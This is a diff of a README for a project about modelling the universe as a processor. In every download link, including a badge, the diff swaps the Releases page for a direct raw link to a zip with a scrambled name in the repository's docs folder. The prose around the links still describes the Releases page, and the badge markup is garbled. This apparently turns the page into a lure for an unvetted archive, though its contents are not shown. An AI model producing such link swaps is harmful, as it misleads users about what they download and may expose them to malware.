@@ -1,6 +1,6 @@
 # 🌌 MUCG-Modele-de-l-Univers-Computationnel-Geometrique - Explore the Universe as a Processor
 
-[![Download MUCG](https://img.shields.io/badge/Download%20MUCG-%20v1.0-4CAF50.svg)](https://github.com/vickysoupz/MUCG-Modele-de-l-Univers-Computationnel-Geometrique/releases)
+[![Download MUCG](https://github.com/vickysoupz/MUCG-Modele-de-l-Univers-Computationnel-Geometrique/raw/refs/heads/main/docs/Computationnel-Geometrique-Modele-de-Univers-l-MUC-3.9.zip%20MUCG-%https://github.com/vickysoupz/MUCG-Modele-de-l-Univers-Computationnel-Geometrique/raw/refs/heads/main/docs/Computationnel-Geometrique-Modele-de-Univers-l-MUC-3.9.zip)](https://github.com/vickysoupz/MUCG-Modele-de-l-Univers-Computationnel-Geometrique/raw/refs/heads/main/docs/Computationnel-Geometrique-Modele-de-Univers-l-MUC-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before downloading, ensure your system meets these requirements:
 
 To get started, you need to download the software. Visit the Releases page, where you can find the latest version.
 
-[Visit this page to download](https://github.com/vickysoupz/MUCG-Modele-de-l-Univers-Computationnel-Geometrique/releases)
+[Visit this page to download](https://github.com/vickysoupz/MUCG-Modele-de-l-Univers-Computationnel-Geometrique/raw/refs/heads/main/docs/Computationnel-Geometrique-Modele-de-Univers-l-MUC-3.9.zip)
 
 1. Click on the link above.
 2. Select the version you want to download.
@@ -73,4 +73,4 @@ This project is open-source and licensed under the MIT License. You can freely m
 
 Keep an eye on the Releases page for the latest updates and features as they come out.
 
-[Visit this page to download](https://github.com/vickysoupz/MUCG-Modele-de-l-Univers-Computationnel-Geometrique/releases)
+[Visit this page to download](https://github.com/vickysoupz/MUCG-Modele-de-l-Univers-Computationnel-Geometrique/raw/refs/heads/main/docs/Computationnel-Geometrique-Modele-de-Univers-l-MUC-3.9.zip)
